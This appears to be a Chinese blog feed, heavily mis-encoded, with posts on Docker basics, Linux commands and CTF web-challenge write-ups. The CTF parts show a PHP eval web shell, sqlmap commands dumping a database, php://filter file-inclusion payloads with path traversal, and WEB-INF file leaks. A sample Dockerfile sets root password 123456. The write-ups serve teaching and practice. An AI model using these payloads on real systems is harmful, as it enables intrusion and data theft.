<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>-t: åœ¨æ–°å®¹å™¨å†…æŒ‡å®šä¸€ä¸ªä¼ªç»ˆç«¯æˆ–ç»ˆç«¯</p>
<p>-i: å…è®¸ä½ å¯¹å®¹å™¨å†…çš„æ ‡å‡†è¾“å…¥ (STDIN) è¿›è¡Œäº¤äº’</p>
<p>ä½¿ç”¨exitå‘½ä»¤æ¥é€€å‡ºå®¹å™¨</p>
<p>è¿è¡Œå‘½ä»¤ cat &#x2F;proc&#x2F;versionå’Œlsåˆ†åˆ«æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯å’Œå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨</p>
<p>åˆ›å»ºä¸€ä¸ªä»¥è¿›ç¨‹æ–¹å¼è¿è¡Œçš„å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313215443115.png" alt="image-20230313215443115"></p>
<p>è¿™ä¸ªabfa742a4467336345a690967fade5b691f463acf88a700905f29b38511312ceæ˜¯å®¹å™¨IDï¼Œ</p>
<p>å¯ä»¥é€šè¿‡ä½¿ç”¨docker psæ¥æŸ¥çœ‹å®¹å™¨æ˜¯å¦åœ¨è¿è¡Œ</p>
<p><img src="/2023/03/21/docker/image-20230313215803571.png" alt="image-20230313215803571"></p>
<p>CONTAINER ID: å®¹å™¨ IDã€‚</p>
<p>IMAGE: ä½¿ç”¨çš„é•œåƒã€‚</p>
<p>COMMAND: å¯åŠ¨å®¹å™¨æ—¶è¿è¡Œçš„å‘½ä»¤ã€‚</p>
<p>CREATED: å®¹å™¨çš„åˆ›å»ºæ—¶é—´ã€‚</p>
<p>STATUS: å®¹å™¨çŠ¶æ€ã€‚</p>
<p>PORTS: å®¹å™¨çš„ç«¯å£ä¿¡æ¯å’Œä½¿ç”¨çš„è¿æ¥ç±»å‹ï¼ˆtcp\udpï¼‰ã€‚</p>
<p>NAMES: è‡ªåŠ¨åˆ†é…çš„å®¹å™¨åç§°ã€‚</p>
<p>ä½¿ç”¨docker logså‘½ä»¤ï¼ŒæŸ¥çœ‹å®¹å™¨å†…çš„æ ‡å‡†è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs abfa742a4467</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313215923779.png" alt="image-20230313215923779"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs epic_herschel</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220031309.png" alt="image-20230313220031309"></p>
<p>åœæ­¢å®¹å™¨ä½¿ç”¨<strong>docker stop</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop abfa742a4467</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220142312.png" alt="image-20230313220142312"></p>
<p>ä½¿ç”¨<strong>docker ps</strong> æŸ¥çœ‹ï¼Œå®¹å™¨æ˜¯å¦å·²ç»åœæ­¢å·¥ä½œ</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ¥åœæ­¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop epic_herschel</span><br></pre></td></tr></table></figure>





<p>å¦‚æœæ²¡æœ‰ubuntué•œåƒï¼Œå¯ä»¥ä½¿ç”¨docker pullå‘½ä»¤æ¥è½½å…¥ubuntué•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä»¥ä¸‹æ¥å¯åŠ¨ä¸€ä¸ªå®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230313220512225.png" alt="image-20230313220512225"></p>
<p>-i: äº¤äº’å¼æ“ä½œã€‚</p>
<p>-t: ç»ˆç«¯ã€‚</p>
<p>ubuntu: ubuntu é•œåƒã€‚</p>
<p>&#x2F;bin&#x2F;bashï¼šæ”¾åœ¨é•œåƒååçš„æ˜¯å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ &#x2F;bin&#x2F;bashã€‚</p>
<p>ä½¿ç”¨exité€€å‡ºå®¹å™¨</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªå·²ç»åœæ­¢çš„å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start b750bbbcfd88 </span><br></pre></td></tr></table></figure>

<p>åå°è¿è¡Œå®¹å™¨å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --name ubuntu-test ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>åŠ äº†-då‚æ•°é»˜è®¤ä¸ä¼šè¿›å…¥å®¹å™¨</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥é‡å¯åœæ­¢å¾—å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart &lt;å®¹å™¨ ID&gt;</span><br></pre></td></tr></table></figure>

<p>æƒ³è¦è¿›å…¥å®¹å™¨å¯ä»¥ä½¿ç”¨</p>
<p>docker attach(é€€å‡ºæ—¶ä¼šä»¤å®¹å™¨åœæ­¢)</p>
<p>docker exec(ä½¿ç”¨æ­¤å‘½ä»¤ä¼šé€€å‡ºå®¹å™¨ç»ˆç«¯ï¼Œä½†ä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach &lt;å®¹å™¨ ID&gt;</span><br><span class="line">docker exec -it &lt;å®¹å™¨ ID&gt; /bin/bash</span><br></pre></td></tr></table></figure>





<p>åˆ é™¤å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f 1e560fca3906</span><br></pre></td></tr></table></figure>





<p>è¿è¡Œä¸€ä¸ªwebåº”ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull training/webapp  # è½½å…¥é•œåƒ</span><br><span class="line">docker run -d -P training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314112148069.png" alt="image-20230314112148069"></p>
<p>æŸ¥çœ‹å®¹å™¨ä¿¡æ¯çœ‹åˆ°</p>
<p><img src="/2023/03/21/docker/image-20230314112214279.png" alt="image-20230314112214279"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªç«¯å£ä¿¡æ¯ï¼Œå°†5000ç«¯å£æ˜ å°„åˆ°32768ç«¯å£ä¸Š</p>
<p>å¯ä»¥é€šè¿‡ -p å‚æ•°æ¥è®¾ç½®ä¸ä¸€æ ·çš„ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>





<h3 id="é•œåƒä½¿ç”¨"><a href="#é•œåƒä½¿ç”¨" class="headerlink" title="é•œåƒä½¿ç”¨"></a>é•œåƒä½¿ç”¨</h3><p>ä½¿ç”¨ä»¥ä¸‹åä»¤å¯ä»¥åˆ—å‡ºæœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314200747476.png" alt="image-20230314200747476"></p>
<p>REPOSITORYï¼šè¡¨ç¤ºé•œåƒçš„ä»“åº“æº</p>
<p>TAGï¼šé•œåƒçš„æ ‡ç­¾</p>
<p>IMAGE IDï¼šé•œåƒID</p>
<p>CREATEDï¼šé•œåƒåˆ›å»ºæ—¶é—´</p>
<p>SIZEï¼šé•œåƒå¤§å°</p>
<p>ä½¿ç”¨docker pullå‘½ä»¤æ¥è·å¾—ä¸€ä¸ªæ–°çš„é•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:13.10</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨docker runå‘½ä»¤æ¥ä½¿ç”¨é•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run httpd</span><br><span class="line">//ä½¿ç”¨httpdé•œåƒ</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨docker rmiå‘½ä»¤æ¥åˆ é™¤é•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi hello-world</span><br><span class="line">//åˆ é™¤hello-worldé•œåƒ</span><br></pre></td></tr></table></figure>





<p>ä½¿ç”¨Dockerfileæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ</p>
<p>æŸ¥çœ‹ Dockerfileæ–‡ä»¶ä¸­æœ‰ä»€ä¹ˆ(æå‰å†™å…¥)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM    centos:6.7</span><br><span class="line">MAINTAINER      Fisher &quot;fisher@sudops.com&quot;</span><br><span class="line"></span><br><span class="line">RUN     /bin/echo &#x27;root:123456&#x27; |chpasswd</span><br><span class="line">RUN     useradd runoob</span><br><span class="line">RUN     /bin/echo &#x27;runoob:123456&#x27; |chpasswd</span><br><span class="line">RUN     /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line">EXPOSE  22</span><br><span class="line">EXPOSE  80</span><br><span class="line">CMD     /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ¡FROMï¼ŒæŒ‡å®šä½¿ç”¨å“ªä¸ªé•œåƒæº</p>
<p>RUN æŒ‡ä»¤å‘Šè¯‰docker åœ¨é•œåƒå†…æ‰§è¡Œå‘½ä»¤ï¼Œå®‰è£…äº†ä»€ä¹ˆ</p>
<p>æ¥ä¸‹æ¥ä½¿ç”¨docker buildæ¥åˆ›å»ºé•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t runoob/centos:6.7 .</span><br></pre></td></tr></table></figure>

<p>-t ï¼šæŒ‡å®šè¦åˆ›å»ºçš„ç›®æ ‡é•œåƒå</p>
<p>. ï¼šDockerfile æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œå¯ä»¥æŒ‡å®šDockerfile çš„ç»å¯¹è·¯å¾„</p>
<h3 id="å®¹å™¨è¿æ¥"><a href="#å®¹å™¨è¿æ¥" class="headerlink" title="å®¹å™¨è¿æ¥"></a>å®¹å™¨è¿æ¥</h3><p>åˆ›å»ºä¸€ä¸ªpythonåº”ç”¨çš„å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -P training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314210921578.png" alt="image-20230314210921578"></p>
<p>-P :æ˜¯å®¹å™¨å†…éƒ¨ç«¯å£<strong>éšæœº</strong>æ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£ã€‚</p>
<p>-p : æ˜¯å®¹å™¨å†…éƒ¨ç«¯å£ç»‘å®šåˆ°<strong>æŒ‡å®š</strong>çš„ä¸»æœºç«¯å£ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314211055266.png" alt="image-20230314211055266"></p>
<p>è¿˜å¯ä»¥æŒ‡å®šå®¹å™¨ç»‘å®šçš„ç½‘ç»œåœ°å€ï¼Œæ¯”å¦‚ç»‘å®š 127.0.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230314211208567.png" alt="image-20230314211208567"></p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>åœ¨dockerfileæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build .</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230316161309297.png" alt="image-20230316161309297"></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å‘½å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/docker/image-20230316161407911.png" alt="image-20230316161407911"></p>
<p>å¯ä»¥åˆ›å»ºä¸€ä¸ªé•œåƒ</p>
<p><strong>.</strong> ä»£è¡¨æœ¬æ¬¡æ‰§è¡Œçš„ä¸Šä¸‹æ–‡è·¯å¾„</p>
<p>ç„¶åä½¿ç”¨å‘½ä»¤æ¥åˆ›å»ºå®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p &lt;ç«¯å£å·&gt;:80/å…¶ä»– é•œåƒID</span><br></pre></td></tr></table></figure>





<h3 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h3><p>å¦‚æœæœ‰docker-compose.ymlæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ç›´æ¥å¼€å¯é•œåƒåŒæ—¶å¼€å¯å®¹å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ— æ³•è‡ªå·±è§„å®šç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p &lt;ç«¯å£å·&gt;:80/å…¶ä»– é•œåƒID</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>è§£é¢˜æ€è·¯</title>
    <url>/2022/10/02/hello-world/</url>
    <content><![CDATA[<p>CTFæ‹›æ–°èµ›éƒ¨åˆ†wedè§£é¢˜æ€è·¯</p>
<span id="more"></span>

<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby_rce"></a>baby_rce</h3><p><img src="/2022/10/02/hello-world/1.png"></p>
<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/02/hello-world/2.png"></p>
<h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>å…ˆäº†è§£ä¼ªåè®®ä½¿ç”¨data:&#x2F;&#x2F; åè®®<br><img src="/2022/10/02/hello-world/4.png"><br><img src="/2022/10/02/hello-world/5.png"></p>
<h1 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h1><ol>
<li>python sqlmap.py -u â€œ<a href="http://101.42.106.133:9208/index.php?geek=1&quot;">http://101.42.106.133:9208/index.php?geek=1&quot;</a> â€“batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> â€“dbs â€“batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> â€“current-db â€“batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> â€“dbs -D geek â€“tables â€“batch</li>
<li>python sqlmap.py -u <a href="http://101.42.106.133:9208/index.php?geek=1">http://101.42.106.133:9208/index.php?geek=1</a> -D geek -T ffflag â€“columns â€“batch</li>
<li>python sqlmap.py -u 101.42.106.133:9208&#x2F;index.php?geek&#x3D;1 -D geek -T ffflag -C â€œflag,flag_idâ€ â€“dump â€“batch</li>
</ol>
<p>1æ˜¯æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œ2å’Œ3æ˜¯å»è·å–æ•°æ®åº“ï¼Œ4æ˜¯è·å–æ•°æ®åº“ä¸­çš„è¡¨ï¼Œ5æ˜¯æ‹¿åˆ°è¡¨ä¸­çš„å­—æ®µï¼Œæœ€å6æ˜¯ç›´æ¥dumpå­—æ®µä¸­çš„å†…å®¹ï¼Œæ¥è·å–flagã€‚</p>
<p><img src="/2022/10/02/hello-world/image-20221003160746799.png"></p>
<p><img src="/2022/10/02/hello-world/image-20221003160801015.png"></p>
<p><img src="/2022/10/02/hello-world/image-20221003160807151.png"></p>
]]></content>
  </entry>
  <entry>
    <title>buuçš„include</title>
    <url>/2022/12/03/include%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File	[BSidesCF 2020]Had a bad day	[FireshellCTF2020]Caas	[RoarCTF 2019]Easy Java</p>
<span id="more"></span>

<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h3><p>1.æ‰“å¼€é¡µé¢ä»¥åæŸ¥çœ‹æºä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªArchive_room.phpè¿›å…¥ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªæŒ‰é’®ï¼ŒæŒ‰ä¸‹ä»¥åå‡ºç°<strong>æ²¡çœ‹æ¸…ä¹ˆï¼Ÿå›å»å†ä»”ç»†çœ‹çœ‹å§ã€‚</strong>äºæ˜¯ç›´æ¥ä½¿ç”¨æŠ“åŒ…ï¼ŒæŠ“å–æŒ‰ä¸‹æ—¶çš„è·³è½¬</p>
<p>2.æŠ“åŒ…æŠ“åˆ°ä¸€ä¸ªè¢«æ³¨é‡Šçš„secr3t.php æ–‡ä»¶ï¼Œè¿›è¡Œè®¿é—®å‡ºç°æºä»£ç ï¼Œä½¿ç”¨secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>3.php:&#x2F;&#x2F;åè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://filterç”¨äºè¯»å–æºç ã€‚</span><br><span class="line">php://filter/convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„</span><br><span class="line">å¯ä»¥å¾—åˆ°åŠ å¯†åçš„æºä»£ç </span><br><span class="line"></span><br><span class="line">2.php://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>1.è¿›å…¥é¡µé¢éšä¾¿ç‚¹å‡»WOOFERSæˆ–è€…MEOWERSï¼Œåœ¨urlå‘ç°æ–‡ä»¶åŒ…å«</p>
<p>2.url:272ac30f-68db-4774-aad0-77cd28746bee.node4.buuoj.cn:81&#x2F;index.php?category&#x3D;wooferså°†woofersæ¢æˆphp:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.phpå‘ç°æŠ¥é”™</p>
<p>3.å°†phpåç¼€å»æ‰ï¼Œå‘ç°æ­£å¸¸ï¼Œå°†è¿”å›çš„å†…å®¹è¿›è¡Œbase64è§£ç </p>
<pre><code>            &#123;
                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
                    include ($file . &#39;.php&#39;);
                &#125;
éœ€è¦æœ‰woofers,meowers,indexæ‰èƒ½åŒ…å«ä¼ å…¥ä»¥ä¼ å…¥åä¸ºæ–‡ä»¶åçš„æ–‡ä»¶
</code></pre>
<p>4.ç›´æ¥ä½¿ç”¨php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flagæ— æ³•è·å–æºç </p>
<p>5.ä½¿ç”¨php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flagå‘ç°å¯ä»¥æˆ–è€…æºç </p>
<p>6.æœ€åä½¿ç”¨base64è¿›è¡Œè§£ç </p>
<h3 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h3><p>1.å‘ç°éœ€è¦ä½¿ç”¨cè¯­è¨€æ¥åšï¼Œå¹¶ä¸”è¿˜æ˜¯æ–‡ä»¶åŒ…å«é¢˜å‹</p>
<p>2.ç›´æ¥è¾“å…¥<code>#include&lt;/flag&gt;</code>å‡ºç°Bad codeç„¶åä½¿ç”¨#includeâ€™&#x2F;flagâ€™æ²¡æœ‰å›æ˜¾</p>
<p>3.æœ€åä½¿ç”¨#includeâ€&#x2F;flagâ€å‘ç°å‡ºç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cè¯­è¨€çš„#includeæœ‰&lt;&gt;å’Œâ€â€ä¸¤ç§</span><br><span class="line">&lt;&gt;:åœ¨ç³»ç»Ÿæ ‡å‡†å¤´æ–‡ä»¶çš„ä½ç½®æŸ¥æ‰¾å¤´æ–‡ä»¶</span><br><span class="line">&quot;&quot;:å…ˆåœ¨å½“å‰ç›®å½•æ˜¯å¦æœ‰æŒ‡å®šåç§°çš„å¤´æ–‡ä»¶ï¼Œç„¶ååœ¨ä»æ ‡å‡†å¤´æ–‡ä»¶ç›®å½•ä¸­æŸ¥æ‰¾</span><br></pre></td></tr></table></figure>

<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>1.æ ¹æ®wpä¸­çš„å¼±å¯†ç è¾“å…¥admin,admin888æ˜¾ç¤º<strong>flagæ²¡æœ‰åœ¨è¿™é‡Œ</strong></p>
<p>2.ç‚¹å‡»helpå‘ç°æŠ¥é”™ï¼Œæ­¤æ—¶æ˜¯getä¼ å‚ï¼Œæ”¹ä¸ºä½¿ç”¨postä¼ å‚ï¼Œä½¿ç”¨åè®©ä¸‹è½½help.docxï¼Œä¸‹è½½æ‰“å¼€åæ˜¾ç¤º<strong>ç¡®å®šä½ çš„flagåœ¨è¿™é‡Œå—</strong></p>
<p>3.ä½¿ç”¨burpæŠ“åŒ…helpè¿™ä¸ªç½‘é¡µï¼Œå°†getä¼ å‚æ”¹ä¸ºpostï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨<code>WEB-INF/web.xml</code>æ³„éœ²ï¼Œä½¿ç”¨<code>POST /Download?filename=WEB-INF/web.xml HTTP/1.1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å›æ˜¾å‘ç°   &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>4.ç„¶åä½¿ç”¨WEB-INF&#x2F;classesï¼Œä½¿ç”¨<code>POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å›æ˜¾æœ‰SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==</span><br><span class="line">å…¶ä¸­çš„ZmxhZ3s0YTMwZjdmOS05YmNhLTQ0MTMtYmExNy1hNjgzMjJiZWRmOWV9Cg==æ˜¯base64ç¼–ç ï¼Œè¿›è¡Œè§£ç å°±æ˜¯flag</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>linuxå‘½ä»¤</title>
    <url>/2022/10/03/linux/</url>
    <content><![CDATA[<p>linuxçš„åŸºæœ¬å‘½ä»¤</p>
<span id="more"></span>

<h6 id="1-cdå‘½ä»¤ï¼ˆåˆ‡æ¢ç›®å½•ï¼‰"><a href="#1-cdå‘½ä»¤ï¼ˆåˆ‡æ¢ç›®å½•ï¼‰" class="headerlink" title="1.cdå‘½ä»¤ï¼ˆåˆ‡æ¢ç›®å½•ï¼‰"></a>1.cdå‘½ä»¤ï¼ˆåˆ‡æ¢ç›®å½•ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //åˆ‡æ¢åˆ°æ ¹ç›®å½•</span><br><span class="line">cd /bin              //åˆ‡æ¢åˆ°æ ¹ç›®å½•ä¸‹çš„binç›®å½•</span><br><span class="line">cd ../               //åˆ‡æ¢åˆ°ä¸Šä¸€çº§ç›®å½• æˆ–è€…ä½¿ç”¨å‘½ä»¤ï¼šcd ..</span><br><span class="line">cd ~                 //åˆ‡æ¢åˆ°homeç›®å½•</span><br><span class="line">cd -                 //åˆ‡æ¢åˆ°ä¸Šæ¬¡è®¿é—®çš„ç›®å½•</span><br><span class="line">cd xx(æ–‡ä»¶å¤¹å)       //åˆ‡æ¢åˆ°æœ¬ç›®å½•ä¸‹çš„åä¸ºxxçš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨æŠ¥é”™</span><br><span class="line">cd /xxx/xx/x         //å¯ä»¥è¾“å…¥å®Œæ•´çš„è·¯å¾„ï¼Œç›´æ¥åˆ‡æ¢åˆ°ç›®æ ‡ç›®å½•ï¼Œè¾“å…¥è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨tabé”®å¿«é€Ÿè¡¥å…¨</span><br></pre></td></tr></table></figure>

<h6 id="2-lså‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•ï¼‰"><a href="#2-lså‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•ï¼‰" class="headerlink" title="2.lså‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•ï¼‰"></a>2.lså‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶</span><br><span class="line">ls /                 //æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">ls -a                //æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—çš„æ–‡ä»¶ï¼‰</span><br><span class="line">ls -l                //åˆ—è¡¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåˆ—è¡¨æŸ¥çœ‹ï¼Œæ˜¾ç¤ºæ›´å¤šä¿¡æ¯ï¼‰ï¼Œä¸å‘½ä»¤&quot;ll&quot;æ•ˆæœä¸€æ ·</span><br><span class="line">ls /bin              //æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶</span><br></pre></td></tr></table></figure>

